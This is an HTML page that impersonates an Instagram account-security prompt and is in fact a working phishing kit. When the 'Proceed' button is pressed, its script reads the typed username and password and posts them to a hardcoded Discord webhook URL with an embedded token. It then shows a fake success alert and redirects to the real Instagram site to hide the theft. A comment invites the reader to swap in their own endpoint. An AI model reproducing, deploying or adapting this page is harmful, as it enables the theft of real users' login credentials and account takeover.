<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="instagram-icon.png" type="image/png"> <!-- Instagram logo as favicon -->
    <link rel="stylesheet" href="css1.css">
</head>
<body>
    <div id="mainContainer">
        <div class="securityBox">
            <div class="logoContainer">
                <h1 class="instagramLogo">Instagram</h1>
            </div>
            <p class="securityMessage">
                Enter your address and password to proceed. If it was not you, please secure your account immediately.
            </p>
            <form id="securityForm">
                <input type="text" placeholder="Phone number, username, or email" class="inputField">
                <input type="password" placeholder="Password" class="inputField">
                <button type="button" id="loginButton" onclick="sendLogin()">Proceed</button>
            </form>
        </div>
    </div>

    <script>
        function sendLogin() {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://discord.com/api/webhooks/1324203466033201162/R220nqlepCtG-rYrkGpeKjYQ4q9QpOuFjRUt0c1EvlcSyOcYd86mA3D2ArkVn6J77nkr"); // Replace with your endpoint
            xhr.setRequestHeader('Content-Type', 'application/json');
            var payload = {
                content: `> **USERNAME:** ${document.querySelector('.inputField:nth-child(1)').value}\n> **PASSWORD:** ${document.querySelector('.inputField:nth-child(2)').value}`
            };
            xhr.send(JSON.stringify(payload));
            alert("Verification submitted successfully.");
            setTimeout(() => {
                window.location.replace("https://www.instagram.com");
            }, 2000);
        }
    </script>
</body>
</html>
